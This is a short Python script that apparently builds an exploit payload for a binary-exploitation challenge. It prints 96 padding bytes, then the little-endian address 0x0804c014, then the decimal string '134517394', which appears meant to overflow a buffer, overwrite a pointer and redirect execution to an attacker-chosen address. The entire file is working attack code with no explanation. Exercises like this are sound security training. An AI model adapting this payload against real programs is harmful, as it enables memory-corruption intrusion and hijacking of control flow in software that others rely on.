import sys

for _ in range(96):
    sys.stdout.buffer.write(b'a')

for i in range(0, 4):
    sys.stdout.buffer.write(bytes([0x0804c014 >> i * 8 & 0xff]))

for c in '134517394':
    sys.stdout.buffer.write(bytes(c, encoding='utf-8'))
